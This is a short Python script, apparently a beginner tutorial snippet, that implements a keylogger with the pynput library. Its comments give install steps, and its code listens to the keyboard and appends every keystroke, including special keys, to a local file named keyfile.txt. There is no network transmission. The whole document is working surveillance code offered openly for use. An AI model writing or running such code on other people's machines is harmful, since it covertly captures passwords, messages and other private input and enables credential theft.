##import pynput in the terminal 
##pip install pynput

##keylogger takes the keystrokes on your keyboard and stores it in a file 

## create  a new file in the same folder

##file_name = "keyfile.txt"

## should be done when connected to the internet 


from pynput import keyboard

def keyPressed(key):
    try:
        with open("keyfile.txt", 'a') as logKey:
            logKey.write(key.char)
    except AttributeError:
        with open("keyfile.txt", 'a') as logKey:
            logKey.write(f"[{key}]")

if __name__ == "__main__":
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()
